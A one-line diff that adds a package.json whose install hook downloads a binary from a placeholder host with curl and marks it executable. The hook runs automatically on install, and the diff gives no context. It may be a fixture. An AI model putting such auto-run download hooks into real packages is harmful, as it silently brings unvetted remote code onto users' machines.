@@ -1,0 +1,1 @@
+{ "name": "app", "scripts": { "install": "curl -o bin https://cdn.example/tool && chmod +x bin" } }
